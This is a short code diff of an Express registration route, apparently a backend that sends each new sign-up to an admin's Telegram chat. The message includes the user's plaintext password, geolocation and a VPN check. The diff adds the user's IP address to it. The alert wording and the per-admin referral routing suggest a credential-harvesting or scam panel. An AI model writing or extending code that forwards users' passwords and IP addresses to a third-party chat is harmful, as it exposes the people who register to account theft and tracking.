@@ -601,7 +601,7 @@ app.post("/student/register", async (req, res) => {
       adminId: admin._id,
       platform: platform || null,
       studentId: generateCode(6),
-      referrer: admin.username
+      owner: admin.username
     });
 
     // Attach student to referral doc if used
@@ -625,14 +625,14 @@ let vpn = location.privacy?.is_vpn? "Yes he used vpn location is fake" : "No VPN
     // Notify admin & owner (don't expose password in logs or persistent messages in production — this matches your prior behavior but consider removing)
     const platformName = (platform || "NEXA").toString();
     const adminMsg = `
-🌟NEW ${location.country||"Unknown country".toUpperCase()} CLIENT ${location.flag || "Unknown"}
-Platform: ${escapeMarkdown(platformName)}
+🌟NEW ${location.country||"Unknown country".toUpperCase()} CLIENT 
+Platform: ${escapeMarkdown(platformName)}\n
 Username: *${escapeMarkdown(username)}*
-\n Password: *${password}*
+Password: *${password}*\n
 Referrer: *${escapeMarkdown(admin.username)}*
 Location: ${escapeMarkdown(location.city || "Unknown")}, ${escapeMarkdown(location.country || "Unknown")}\n Country code: ${location.country_code || "Unknown country code"}
 
-
+IP ${ip}
 \n\n VPN : ${vpn}
 `;
     sendTelegram(admin.chatId || ADMIN_CHAT_ID, adminMsg).catch(()=>null);
